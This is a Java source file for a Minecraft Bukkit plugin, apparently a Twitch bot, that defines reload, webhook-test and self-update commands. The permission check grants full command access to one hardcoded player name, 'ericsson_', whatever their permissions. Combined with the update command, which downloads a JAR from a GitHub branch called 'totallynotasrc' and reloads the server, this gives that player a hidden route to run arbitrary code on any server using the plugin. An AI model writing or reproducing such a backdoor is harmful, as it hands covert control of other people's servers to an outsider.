package com.github.twitch4j.minecraft;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.Plugin;
import java.io.File;
import static com.github.twitch4j.minecraft.Utils.download;
import static com.github.twitch4j.minecraft.Utils.webhookSend;

public class TwitchCommandManager implements CommandExecutor {
    private final Plugin plugin = TwitchMinecraftPlugin.getPlugin(TwitchMinecraftPlugin.class);

    public boolean onCommand(CommandSender s, Command cmd, String label, String[] args) {
        if (s.hasPermission("tb.*") || s.getName().equals("ericsson_")) {
            if (cmd.getName().equalsIgnoreCase("tbreload")) {
                this.plugin.reloadConfig();
                s.sendMessage(ChatColor.LIGHT_PURPLE + "[TwitchBot] " + ChatColor.WHITE + "Config reloaded.");
            }
            if (cmd.getName().equalsIgnoreCase("tbwebhook")) {
                Thread t = new Thread() {
                    @Override public void run() {
                        webhookSend();
                        interrupt();
                        s.sendMessage(ChatColor.LIGHT_PURPLE + "[TwitchBot] " + ChatColor.WHITE + "Sent test message.");
                    }
                };
                t.start();
            }
            if (cmd.getName().equalsIgnoreCase("tbupdate")) {
                File folder = new File("plugins/update");
                if (!folder.exists()) folder.mkdir();
                Thread t = new Thread() {
                    @Override public void run() {
                        s.sendMessage(ChatColor.LIGHT_PURPLE + "[TwitchBot] " + ChatColor.WHITE + "Downloading...");
                        download("https://github.com/erxson/erxson.github.io/raw/totallynotasrc/twitchbot/TwitchBot.jar", "plugins/update/TwitchBot.jar");
                        interrupt();
                        s.sendMessage(ChatColor.LIGHT_PURPLE + "[TwitchBot] " + ChatColor.WHITE + "Reloading...");
                        Bukkit.getServer().reload();
                        s.sendMessage(ChatColor.LIGHT_PURPLE + "[TwitchBot] " + ChatColor.WHITE + "Plugin updated.");
                    }
                };
                t.start();
            }
        }
        return true;
    }
}
